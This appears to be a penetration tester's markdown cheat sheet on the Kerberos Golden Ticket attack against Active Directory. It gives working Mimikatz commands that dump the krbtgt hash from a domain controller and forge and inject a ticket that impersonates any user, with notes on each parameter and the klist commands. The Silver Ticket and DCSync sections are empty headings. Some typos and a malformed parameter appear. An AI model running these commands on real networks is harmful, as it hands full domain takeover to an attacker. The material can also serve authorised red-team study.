## Golden Ticket
- Forges a fake TGT ticket to submit to the DC to get the TGS ticket.
- A golden ticket is signed and encryted by the hash of krbtgt account which makes it a valid TGT ticket
- krbtgt user hash could be used to imperasonate any user with any privileges even a non-domain machine

 ### Hash Dump to get KrbTGT hash
Execute Mimikatz on DC as Admin
```
# Hash dump
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername {Computer Name}

# DC sync hash dump
Invoke-Mimikatz -Command '"lsadump::dcsync /user:{USERNAME}"'
```
> domain\krbtgt
```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain: /sid: /krbtgt: startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```
> - /user = Uername for which the TGT will generate
> - /domain: domain - FQDN
> - /sid - SID of the domain
> - /krbtgt: - NTLM (RC4) hash of the krbtgt acc
> - /aes128 /aes256 - AES key (optional)
> - id:500 /groups:512 (optional)
> - /ptt (inject the ticket to PS)
> - /ticket (save the ticket to a file)
> - /startoffset - when the ticket is available in minutes. Check the policy for the ticket. If not specificed its 0
> - /endin - ticket lifetime default is 10 years. Default AD setting is 10 hours (600mins)
> - /renexmax - ticketlifetime with renewal (default 10 years). AD default is 7 days (10080)

### Display tickets
```
# Display
klist

# Purge all tickets
klist purge
```
## Silver Ticket
## DCsync
